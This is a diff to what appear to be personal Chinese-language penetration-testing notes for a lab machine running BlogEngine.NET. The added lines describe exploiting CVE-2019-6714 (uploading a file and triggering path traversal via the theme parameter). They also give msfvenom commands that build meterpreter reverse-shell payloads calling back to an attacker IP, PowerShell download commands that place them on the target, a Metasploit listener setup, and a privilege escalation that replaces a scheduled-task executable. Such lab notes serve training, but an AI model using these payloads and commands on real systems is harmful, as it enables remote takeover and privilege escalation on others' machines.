@@ -129,19 +129,62 @@ BlogEngine
 #漏洞号
 CVE:
 2019-6714
+https://www.exploit-db.com/exploits/46353
+
+#利用方法
+/*
+ * CVE-2019-6714
+ *
+ * Path traversal vulnerability leading to remote code execution.  This 
+ * vulnerability affects BlogEngine.NET versions 3.3.6 and below.  This 
+ * is caused by an unchecked "theme" parameter that is used to override
+ * the default theme for rendering blog pages.  The vulnerable code can 
+ * be seen in this file:
+ * 
+ * /Custom/Controls/PostList.ascx.cs
+ *
+ * Attack:
+ *
+ * First, we set the TcpClient address and port within the method below to 
+ * our attack host, who has a reverse tcp listener waiting for a connection.
+ * Next, we upload this file through the file manager.  In the current (3.3.6)
+ * version of BlogEngine, this is done by editing a post and clicking on the 
+ * icon that looks like an open file in the toolbar.  Note that this file must
+ * be uploaded as PostView.ascx. Once uploaded, the file will be in the
+ * /App_Data/files directory off of the document root. The admin page that
+ * allows upload is:
+ *
+ * http://10.10.10.10/admin/app/editor/editpost.cshtml
+ *
+ *
+ * Finally, the vulnerability is triggered by accessing the base URL for the 
+ * blog with a theme override specified like so:
+ *
+ * http://10.10.10.10/?theme=../../App_Data/files
+ *
+ */
 
 #编译一个稳定的shell，拿到meterpreter
 msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.13.21.169 LPORT=4444 -f exe -o shell.exe
 
 #x64 meterpreter
-msfvenom -p windows/x64/meterpreter_reverse_tcp  LHOST=10.13.21.169 LPORT=4444 -f exe > shell_x64.exe
+msfvenom -p windows/x64/meterpreter_reverse_tcp  LHOST=10.13.21.169 LPORT=4445 -f exe > Message.exe
 
 #从靶机下载到本地，注意要放到c:\Windows\Temp下，其他文件夹可能没有权限
-powershell -c "Invoke-WebRequest -Uri 'http://10.13.21.169:8000/shell_x64.exe' -OutFile 'c:\Windows\Temp\shell_x64.exe'"
+powershell -c "Invoke-WebRequest -Uri 'http://10.13.21.169:8000/Message.exe' -OutFile 'c:\Windows\Temp\Message.exe'"
 
 #msf 监听
 1，use exploit/multi/handler 
 2，set playload windows/meterpreter/reverse_tcp
+
+
+#提权到adminstrator。Message.exe文件每30秒会以adminstrator的身份执行一次。
+
+1，编译木马文件反弹shell，文件名Message.exe
+msfvenom -p windows/x64/meterpreter_reverse_tcp  LHOST=10.13.21.169 LPORT=4445 -f exe > Message.exe
+
+2，上传文件，替换定时任务文件，如果从meterpret中替换，会报权限不足，从shell直接上传不会有这个问题
+powershell -c "Invoke-WebRequest -Uri 'http://10.13.21.169:8000/Message.exe' -OutFile 'C:\Program Files (x86)\SystemScheduler\Message.exe'"
 
 
 run ost/multi/recon/local_exploit_suggester 
@@ -162,6 +205,7 @@ meterpreter > run post/multi/recon/local_exploit_suggester
 [-] 10.10.151.70 -   /usr/share/metasploit-framework/modules/post/multi/recon/local_exploit_suggester.rb:121:in `block in run'
 [-] 10.10.151.70 -   /usr/share/metasploit-framework/modules/post/multi/recon/local_exploit_suggester.rb:119:in `each'
 [-] 10.10.151.70 -   /usr/share/metasploit-framework/modules/post/multi/recon/local_exploit_suggester.rb:119:in `run'
+
 
 
 
